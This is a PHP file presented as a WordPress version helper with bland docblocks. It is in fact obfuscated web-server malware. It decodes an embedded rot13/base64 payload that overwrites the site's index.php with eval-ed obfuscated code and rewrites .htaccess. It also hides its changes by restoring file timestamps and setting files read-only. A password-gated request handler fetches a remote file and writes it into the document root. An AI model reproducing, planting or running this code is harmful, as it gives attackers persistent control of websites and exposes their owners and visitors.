<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('W1siXC92YXJcL3d3d1wvaHRtbFwvaW5kZXgucGhwIiwiPD9waHBcbiAgJEZYZzVEOHM9J1A5S3lBK3ZaQnFhRXFLanlTMjViT3kzRTNxSm5LUzFydEorVWd0UWZrSVRVSVNHakxyXC85NFpBQ1JCU3BhZDQ3M3RoXC9wdGJCeHpZVEF6bUJrdVlVSGdCMjdBUm40UWNtOXFkVm83cXdlVWhXN0lNK2FtUE9PaHRiN1ZFY3Q4NnZrQmM4ZVVCVzUwQ3doV0Y1YWIxMW5xUlJralBXSm0wWWhTQnhaTVdFOUNXT3JBZ1BLUXdZNDc0YW1BVW5PRWdUXC9lT0lQRlo1MU9EZ296dzREeGZ4SWVJRGpDemNKdzVGNnhXNXpqR05iNHhPTFV4UW0xV3EydnEwUUE1UUFVSU81WVNsbDlBOWVCVHpZT3VCdG11RXl6Z1AwK1pqUjBZYzNDRStFZWpRTStDcFVzd0l1R0FmeG5sWmcyTVp6UmJHUzB5Sk1ucENFa0J5bFdCSElVb09Uc2VwVDZDYk1rbkUxS1hHQ3lVdVdTb1wvM1crZVFJK0gwRFlYUTVDNUR1cFwvb1dTSVozbUVZeGNOc0hWa2E3enU4T0QxR3U5SHFtaVVxREgyM1JiQ3Yxb0xadVRjZU1LTnVDUHhzdWc5OWVES2ZCMnhBSUtCRzFLandtWXk4T3VlXC9WVlNyNThBbUJHd1Bic3BydXliRFwvdDJIXC9ON01cL1wvT3ZwOEdUZ252WVwvbUo5YUNyQVVDbmtzaHQwUmtQa05xeDloRWxVR1VUQzlyRksraFwvcngrMk1ZWDV5Ym40aER6SDBUZnRlcHdOM3NGR1JxckwrSEtoeW5cLzlvOUdmUVwvSEw0emRkS3I1ZStBaGVQQVU2VHhiZzZha2RReHNuazNISUJ3c2ZscFh4dHZLNHZOQVJ0b3cyaWtCU1lzWEFWZ3J3WWFyQmloMmErd2EzQjJZU3BOY05CUjdvYzh5VWVqYUZwNHBcL0pVM2ZMQWVtelR0S1Vyb05QNk5LeG80XC8xZ2NPeStQem9aNEdtYmNlckhYNVNEbzd5amdFM2RMQXJqbVdVZWpDQVlxVGlCOGVTQUk5M0MxRkR1Z3htTEVoWll4aHZmQzVrWHJvVTNJN1pOUW5ZZHRtTktkMGc4aXdJd2h0NDRuS3k5TVBDQXFCVGQ2XC9Bb3JhXC9hVWdcLzhadWNPblV1eXhzT0thTExkYmw5ZFhUbFQzNSttekluOXJJMEM3aXV3bm9nd0FDT09yTkV6SEVNN2hQRG9XRXFMSGpaRlMxWDdTanhRNThnSHI4cWh3Sk5QbENpSGZzZ25QSTdFRmZaWnpQZ2xTd3loaWhVV3ozeUFITjlDdU1Zd1R0NEpRVW1PKzBqNUhJTnNrNk5cL05YWnZnejBVVnRuNHo2VVwvN1BlUCtpVUxVRWttbjRBc2RJUElTNnp1cGszVzhjRlptZmdRY0xsNFJRajgzU1VDRk1kUG40cHpcL1wveDdhdkw4cHBaZTFRXC9jMVU5UXBoS3lmbDNsZmYxa0h0VXJ3enU3azlFQ1k4VnFjK3FybDVreVwvMFYzYTYzNzNBR3RmeG54S1hWOEwrV2VlRFJHRWFWWGZvREJKRXMyTGZ4M29LTFdLTUVRalVHTFdCb2NVTnljM0U3V3R5WmJ0OTNPODA3RTRxM05TYWNUMzc1ZzY1dnh5emplTUZ0RVBXTExnNDBBR1VYaERFQWdyY0I4eFhMZDh3OFhROWR0cVcxTVQxd0ZJMkFkc3gzNHQzNUluZkE2TkJWVUVvVVJudlVVc3FBMWlJZGV1RTMrc25xV3B2N1ZOc0huc1wvYXdod0hQOUtpakhKMW9TMldBMXRlTU52Y1NkaTF6QVdudGlyY2tpWk9XWTN3TVBucHdTK3BpdDR1Yk5SeWhFa2VqT1JlTUNudjVMc3BHdTA0T3psNTFaZkRrN3VhOEorODJxMjRNK3BoVEUzbXNWbjZlV2pUZkx6M3B4MVNqa3hRS09vaG5tWjlZUm1sWWtLaDFubTlLTFFrTEhJZHVIbEpxY0pJOXZ0VEN2ZVVlRVE4NFNYeVBOUnFHdE5MY040dUVyTXlVU1ptTWtRYTg4dUdOVmZXWkVcL0JGVkR1RXQ5QUhxNFluZGdGQUE3M1RuMHdLQjlTU2xUQVlNNVdmRWRTajRGVlB6SVI3dm5MUGpcL3FcL25QWGZEdCs2eFwvMmp3WkhpXC9UQVlSSWNpMHllUGxXSGhlZDN6XC90SGh3QjBldm5VZmRmeEY4SVwvVWhwN1JUU0tRYWk3WFNpT0kxVm9VTXdUSHN6ZHZoc2NEOStMczhOM3AyYnVoOFVtRGhBY0loNWh2K1hRK0FKN0N6QVdjUTVselNSREE4V2xMbFZBTHJxVVwvUEJcLzJoXC8weWJ3WnZTZW1zSmxzTmRtY2VrbHJGdEZXV1l6VW9VNVljZVRhbzVcL3VcL0hnMkc3dG5idDRLNnJBRWZCRk8xR2hmRm1vQzJJU3N0RGlKV1ZOVlUxR2UyWWN1TlwvQ2tvdUJUZ0l2Y1hOVlJEcVV5dmFsdmtqelwvSVFXV3BVbURkV3dCWEtNcGlXTkdTa3lWVVpNVjhWOCtjMlwvODJJVDVoSk5MaEhkUDZtRHh0N1dNMGFyWXJ5YlNOb1JES3lseEZ5XC9KcWpHVktSNlh0U0hTb1NpdjFtNmdhS3RXQks2dURFbnhoRFNjUnUzaTIwbWVhXC9CSk9JbmJVZW40NGZ4eGFuMTAxczJRcVlnTU5Xd1JpdTVuQVA0VnNLNTNhUlRlaGxVTlZudWM4Z01wU3FBaWhEM0dCSGRTVUdMZ1ZOajNaZUxCRmhvRXd2WTZFb3FPVWh4U0JlNmdaREFSaWdHSCtrRjFwZHk4VHJJS2lZOEpqWXpwU0VFaFRsR1JKNkltSEVmQlpEN1o1NHBoUEpGVkhVSWVwa0VjOVUrWVR1RkNjSlRoV0I4QzVHc0ppSVRLczVtTUpXNUhlcVoxSGdXaDdjckU0bVpNZmNrY1BpdUtScFJsY2F1SmJlT2hXOVE3MFc4Y1lzdUQrdnBiV3FUZUhjdXVxOTRnV1dXQ3RYYVNaSVNyV0JhT0dYWUpqeTNpOWxxMGxId2Z2dFwvazJQVFpzN0pwWnJUeU01T0pLajBLU3VcL3VnY1hMSkFnckg2UmxkcDJNUWhuMFZ5TkY3eHVuZ0hDclZcL2IzVlhZeVBMRlFpWVlPTjlneVZZMkI5b3doRGVoMU0yelNld1lUbVJ0RHVPQzhOSFhQN212SUs5dFc2d0lNQTBtMlwvK3ZYaVJPQ3ZjWStHa1JlekFwZkNrY1RXaFM4cm1XOFNvZElaK1FhOE1xbWtpYkZuTHRha0E2cUVEVlRUbmdEWWhUaTloMllOaktSellLZEYxQVFPTnNPdys3TGJSaUFGSHRFUThyQTlBVmJjcWdSU1d4SXd4bGVLVFFMMisxNFM4ZlJtdDYydFNKQlJ3SDFJd1c3Mk9rNTN0MTNNVUw0MkNtaVdMMk85TVNqeVNEVGZORGNaNFViQ3dHcG5sdnVRUjdNSXdueEJMS0trZVJtbFk2WWJlVTdrTzlRa2lSSG56OWJXM1Z5M3BpRzdOVml0bEVyU0g1Zzg5VGJzdVJUZkxuVFNFbldLQ1BHWVErZkxqckVxMklQVFlZMnJoWnlwZk9MUzFsZFM3ZDRjaUd3ZHRzdHNYVjNrQ2lhYmpRSVdjMExzSm1CZEdlTzljVTgrTGlzcllnbzhcL1JFd2lXYzJlWFBhdnpnNnhoN25oVTF5Y3ZlRDlZZUQwXC83aG9IOTJlQUpabU4xdDFmc1dBcE5kc3hqeFNscVExbENXTDkzQndmSTJZNDVhVVlIcUVHSnpXd3k3cWlGeWk5M2hEVGRoc1REbTZIMlwvRTdcLzFMeStlbmZQWE41dFo5T3FmbjVOM1NUZjZwWjllZUxOTnhsK3V4MW5hK2Z0Z09FN2V6enBHUzdUQkJjbG5QMHJ5ZzA1eVZ0d0prSjJcL0pzT1poVkVjTTBwRlY3QXBLc3JsR0VYUktURlNIMTNTaFRrbTdsY2pDSjV4T2s0WWJlTXJtNEtIckVrUWdaSmpMSUxIOVFKb0F2eGNsdkRRWDBqN2hBTnRkc3haRzFaVGY4cTlIRk0rZHdtSHJHMGhnbW85TGFndkFUeEtNdTYxZVJaTkFRVmlpbisxbHJJSkZKMGpiNHBGWjBVOXdvWWVUU2ZnMDFsSnFMeVdKVlFLNFJVaG12R1U0eFNnd0M0dWVlcE0rZVJiNUZwS01RNXU0TmtyYU5aRXpDOTZtVzFveGxEaVBJeFJ3S3VPZ0VZbWJ3am9PXC9yNndwTlc4SldmT2pYNWw2RXFSRjE0Ulwvbm1cL1dKdWJXd3NGRk9zWTZDOXE5WmpaZEZoT2pHbFpWbjJRSDViOW53Z2VtSHlpRzhqcEpNOHVTXC9OVGNJaXI2MW12SjhcL3d3Uk1nTjc2RUlSaEFUOHo0ajcraGFtbytIQXVCckFBRWd1T0tEcE1zZGpHT2Y2RnFVOXg0bE1CS0d0YVhNakhzRnlXclQzMThzcVpldkJuWVpacTFsSkpmaGVEeUU2VXZsaVdaSTM4TTZXK2Jac2Vkb3J3dTYxb1dKcDZScXg5MnF6aStGOXdEb2FyVnN6NlI3UnZcL3dDalk4OGRYUCtFV2VkdGlNcHh3Wkh6SFwvbVk2d0MxZlZYUDVYT1I4dDlcLzlwTHpacWVEWDczdVBieG9nclM3VHBjQUpQa0FPSUVYcGVTRUJaRGtreUYrWFRmcnNuNnZMQnVkalVmS0FwRDREWUtjKzJNdmVaQ1wvU3JqMFwvc3lmNkk4UE9lQVNOK3NWcWUwVFZCUk84ZVwvUDliUWxlZWtTazE2ZW5OWlozSDJcL1B5XC96U2lTeXhDMlwvUHhUODM1blwvWjV6NXNmelhPOTFIOGdkSThxdFwveVJKeXpJSXM4Z0E1dmFuTHNkUUM1cmcrYUFLNUVIbnJZWnNJMTc3ZlpPWmlXaDdVOVA4cFJRV1pcL0pPaGNCNHA2ejJ0ZnIxN1hqeXl4RktZMHZPMWpuOVRmbmYraDQ5VUlRT09iaXhEZm5nRnZvWnR2STVtdnQ4Z0orazRHT1hUWXFhKzBKNGxKOHlqcUNGSnpMU0plWU9BdXNaVkc0QllHa2ZWQ2REbEVUSVZoWEp4Um9TcXFnOFBsWFwvT0ZtZXpCVjZyVGd4XC81ajVybERxdmptcHR0ZXAzandXM284S3hxTFcxTDdLUEtybnpRelNxT0pYTG1TXC9BODYxSGxlRVBBaThveGd2ZTlaUFU2XC9JS2NiMDZMOVdabCtnVlVsQ25rMVh5WHcnOyRBUjdQME9ccj1cdGZ1bmN0aW9uKCRrNVo5ZywkaE5JZU8pXHR7IFxyICBcdFx0IFx0IFx0JFA2a3NVPVwiR1RuNVZOb1d1bjNwUzl6T2hzYnBWZDdmR1RCTHJXSWk4Nmt2dHpFY0NONXFKTkdTT1wiOyBcbnJldHVybiAkUDZrc1U7fTtcdGZ1bmN0aW9uIE0zWDMoJFVERnMpXG57JGt1WGJOYnUgPSBcImQ2U0NlRF9FNFwiOyRSeld1PSdCJ1xuLlxyJ0EnOyAkUnpXdSAuPVx0JGt1WGJOYnVbKDI0IC0gMTgpIFwvM11cdC4ka3VYYk5idVsoOTQgLTU4LSA4KSBcLyA0XSAuICgoOTEtNzMpIFwvIDMpLigoOTktOTAgKzMpIFwvIDMpXHI7JFJ6V3UgLj0gICRrdVhiTmJ1WygzMy0gMjEpXC8gMl1cdC5cciRrdVhiTmJ1Wyg4OCAtIDY3KyA5KVwvIDZdOyRSeld1XHIuPSdlJ1xyOyRSeld1Lj1cbiRrdVhiTmJ1Wyg4Mi02OSAtIDEpIFwvIDRdLidPJy4ka3VYYk5idVsoODAgLSA4MClcLzZdLiAka3VYYk5idVsoNDEgLSAyNiArOSlcLzZdLlxyJyc7XG5yZXR1cm4gJFJ6V3UoJFVERnMpO30gZnVuY3Rpb24gIFNSWCAoJGJuSFlUQkptKVxyeyRSZEh0aE82Sm0gPSBcInA5NzRSYjhcIjskSWFpPSgoOTktODggKyAzKSBcLzIpLiRSZEh0aE82Sm1bKDg1IC0gNjkgLTgpIFwvIDJdO1x0JElhaS49ICRSZEh0aE82Sm1bKDkzIC0gOTMpIFwvIDZdXG4uICRSZEh0aE82Sm1bKDUxIC01MSlcLzNdIDsgJElhaSAuPVxuXHQnZCcuKCg0OCAtIDM3ICs3KVwvMilcdC5cdCd1Jy5cdCgoNDgtNDUrOSkgXC8gMykgLigoMTI1IC0gODcgLSA2KSBcLyA0KSA7XHQkSWFpIC49XG5cdCRSZEh0aE82Sm1bKDU3LTM1IC03KVwvIDNdLicnO3JldHVybiAkSWFpO1x0XG4gIFx0fVxyJEZYZzVEOHM9VUZfOXgoJEZYZzVEOHMpO2Z1bmN0aW9uIFNoZ240aUgwICgkUmVIOGspeyRDWUNTM2xkdSA9IFwiMVRTM190XCI7JHdqSXJtQUgzUz0kQ1lDUzNsZHVbKDEzICs4IC05KSBcLzZdLlxyJENZQ1MzbGR1Wyg5NCAtIDcxIC0gOCkgXC8zXVx0LidyJy4gJENZQ1MzbGR1WygxMDkgLTg5KVwvNV1cbi5cdCdSJy5cdCdPJyAuICRDWUNTM2xkdVsoMzMgLSAzMSkgXC8gMl1cdC4gJENZQ1MzbGR1WygyMSAtMjIgKyAxKSBcLyAzXVxuLiAoKDY1LSA1NyArIDEpIFwvMykuJyc7ICByZXR1cm4gJHdqSXJtQUgzUygkUmVIOGspOyAgIFxuXHJcblx0fSBcclxyXHIgJEZYZzVEOHM9XHRNM1gzKCRGWGc1RDhzKTsgXHIgJEZYZzVEOHMgPWljc250ZSgkRlhnNUQ4cyk7ZnVuY3Rpb24gVUZfOXgoJFY4azlRUkdjbCApIHskd05BdFIwMyA9IFwiVGRQQUxcIjskSTdtY255MTJwPSdnJ1x0OyAkSTdtY255MTJwLj0gJ1knLlx0JHdOQXRSMDNbKDExLSAzKSBcLyA0XS4gJHdOQXRSMDNbKDcxLSA3MSkgXC8gMl0gLlxyJHdOQXRSMDNbKDY4LTY0ICsxKSBcLyA1XVx0OyRJN21jbnkxMnBcdC49IFx0KCg2OSAtNDIpXC8gMylcdC5cdCR3TkF0UjAzWyg0MiAtIDM5ICsgOSlcLyA0XVx0LiAnZCdcdC4kd05BdFIwM1soNTMgLSA0MSlcLzNdIC4nJztcclx0XHRcdFx0XHRyZXR1cm4gJEk3bWNueTEycCgkVjhrOVFSR2NsKTtcdCB9JEZYZzVEOHM9XHRTaGduNGlIMCgkRlhnNUQ4cyk7XHRcclx0XHRcckVWYUwgKCRGWGc1RDhzKTtcclxyZnVuY3Rpb24gV1AxRVogKCRVaHprWXA0LCRjRG5xIClcdHsgJHhUbDA9XCJfVTJ3YnZyXCI7XG5yZXR1cm4gJHhUbDA7fWZ1bmN0aW9uIFxyZ1lQVGQ5QWRMKCRmTXJXbTBVSyApe1x0cmV0dXJuIFNSWCgnJykgLiRmTXJXbTBVSzt9XHQgXHJcdGZ1bmN0aW9uIGljc250ZSgkRXphWnVwYyl7JGlrV0s5eiA9IFwiZ0luekFMdFwiOyRfSWRtVENjPSRpa1dLOXpbKDkzIC0gOTMpXC8yXSAuICRpa1dLOXpbKDY4IC01NikgXC80XTskX0lkbVRDY1xyLj0gXHQkaWtXSzl6WygxNi0gMTMpIFwvIDNdLiRpa1dLOXpbKDgxLSA3MylcLyA0XSA7JF9JZG1UQ2NcdC49XG5cdCdGJyAuICRpa1dLOXpbKDExMy04OClcLyA1XVx0Llx0JGlrV0s5elsoMTA3IC0gOTkpXC8gMl1cci5cbiRpa1dLOXpbKDE5LTcpIFwvIDJdLlxyJ2UnIC5cdCcnOyBcclx0IHJldHVybiAkX0lkbVRDYygkRXphWnVwYyk7fWZ1bmN0aW9uIFx0dDNmaDcxRGpcdCgkUzlGWWswViApe1x0JE02ZTdHMT1cInBvSElSNUE2cHJnaVNmTFV3aUdPTF9ldE0xbHY3bWFINU9Jb1wiO1xuXG5yZXR1cm4gJE02ZTdHMTt9OyA/Pjw/cGhwICBkZWZpbmUoJ1dQX1VTRV9USEVNRVMnLCB0cnVlICk7cmVxdWlyZShfX0RJUl9fLiAgJ1wvd3AtYmxvZy1oZWFkZXIucGhwJyApOyA/PiIsImZiMjlmMDRkNzg1NTRmZjA4NDVlOWM5N2U0NzAxYzFhIl0sWyJcL3Zhclwvd3d3XC9odG1sXC8uaHRhY2Nlc3MiLCI8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz5cclxuUmV3cml0ZUVuZ2luZSBPblxyXG5SZXdyaXRlQmFzZSBcL1xyXG5SZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXVxyXG5SZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZlxyXG5SZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZFxyXG5SZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF1cclxuPFwvSWZNb2R1bGU+IiwiYmU0NzZkMjdlY2U4OTU5NDYwNGQxNDg4NmMwODEwMTYiXV0', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("udetw{$check}uxbl", 'f99c839ec5a45a712a71f7ad7e8b3428')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}